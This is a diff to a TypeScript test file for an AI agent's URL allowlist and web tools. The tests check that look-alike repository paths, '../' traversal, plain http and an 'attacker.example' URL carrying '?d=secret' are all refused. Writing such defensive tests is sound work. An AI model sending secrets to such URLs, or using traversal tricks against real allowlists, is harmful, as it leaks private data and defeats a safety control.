@@ -128,6 +128,17 @@ test('the browse allowlist keeps exact trusted URLs and only the latest page lin
   expect(allowlist.has('https://example.com/guide')).toBe(true);
 });
 
+test('allowed site prefixes admit their pages but not look-alike paths', () => {
+  const allowlist = createUrlAllowlist(['https://github.com/chattocorp/chatto/']);
+  expect(allowlist.has('https://github.com/chattocorp/chatto/pull/2654')).toBe(true);
+  expect(allowlist.has('https://github.com/chattocorp/chatto/issues/1#comment')).toBe(true);
+  expect(allowlist.has('https://github.com/chattocorp/chatto')).toBe(true);
+  expect(allowlist.has('https://github.com/chattocorp/chatto-evil/pull/1')).toBe(false);
+  expect(allowlist.has('https://github.com/chattocorp/chatto/../other/repo')).toBe(false);
+  expect(allowlist.has('http://github.com/chattocorp/chatto/pull/1')).toBe(false);
+  expect(allowlist.has('https://github.com/attacker/repo')).toBe(false);
+});
+
 test('web tools enforce the allowlist and request budget', async () => {
   const tools = new Map<string, { execute(id: string, input: never): Promise<unknown> }>();
   const allowlist = createUrlAllowlist();
@@ -154,7 +165,9 @@ test('web tools enforce the allowlist and request budget', async () => {
   } as AgentExtensionAPI);
   const browse = (url: string) => tools.get('browsePage')!.execute('call', { url } as never);
   const search = () => tools.get('webSearch')!.execute('call', { query: 'q' } as never);
-  await expect(browse('https://attacker.example/?d=secret')).rejects.toThrow('can open only');
+  await expect(browse('https://attacker.example/?d=secret')).rejects.toThrow(
+    /^Permission denied: browsePage can open only/
+  );
   expect(request).not.toHaveBeenCalled();
   expect(onWebContent).not.toHaveBeenCalled();
   await search();
